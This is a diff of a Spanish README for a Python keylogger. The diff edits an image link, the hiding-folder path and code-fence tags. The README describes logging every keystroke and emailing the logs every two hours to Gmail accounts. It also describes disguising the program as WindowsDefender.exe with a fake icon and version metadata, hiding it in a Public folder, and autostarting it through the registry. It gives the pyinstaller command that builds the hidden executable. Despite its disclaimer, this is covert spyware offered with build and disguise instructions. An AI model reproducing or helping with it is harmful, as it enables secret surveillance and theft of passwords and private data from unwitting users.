@@ -9,7 +9,7 @@ __Nota importante:__ Esta herramienta tiene como proposito general y de uso excl
 Las razones del uso de un Keylogger son para fines de seguridad de una empresa, ya sea que estén viendo qué está haciendo el personal, cómo interactúan sus personas en las computadoras o que los atacantes intenten obtener información confidencial, como información de inicio de sesión u otros datos confidenciales. Este programa simplemente toma cada pulsación de tecla ingresada en el teclado y luego envía el archivo de registro por correo electrónico cada 2 horas.
 
 ## Carpeta Principal
-![Archivos](https://i.imgur.com/x984atN.png)
+![Archivos](https://i.imgur.com/fvVMi8N.png)
 - `icon.ico`    = Icono Windows Defender
 - `KeyloggerWindows.py` = Código fuente del Keylogger
 - `LICENCE` = Licencia 
@@ -26,7 +26,7 @@ Las razones del uso de un Keylogger son para fines de seguridad de una empresa, 
 - __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `log.txt`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por debuggeo, pero al ser convertida a `*.exe` se utilizara un comando para que ésta se ejecute en segundo plano.
 - __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
-- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `C:\Users\Public` , y en esa carpeta encuentras el archivo `log.txt`.
+- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender"` , y en esa carpeta encuentras el archivo `log.txt`.
 - __Iniciar automaticamente con el sistema:__ Se encuentra un archivo llamado `StartUp.reg`, la cual al ejecutarlo, ésta escribe el registro y permite que el keylogger se ejecute al iniciar sesión.
 - __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
 
@@ -87,7 +87,7 @@ Se utilizará `pyinstaller`
 
     Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
 2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
-````r
+````t
 VSVersionInfo(
   ffi=FixedFileInfo(
     filevers=(6, 1, 7601, 17514),
@@ -121,7 +121,7 @@ VSVersionInfo(
 Mediante Consola debe dirigirse a la carpeta principal.
 Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:
 
-    ````py 
+    ````r
     pyinstaller --clean   --distpath "Keylogger Terminado" -F --windowed --icon icon.ico --version-file version.txt KeyloggerWindows.py
     ````
 
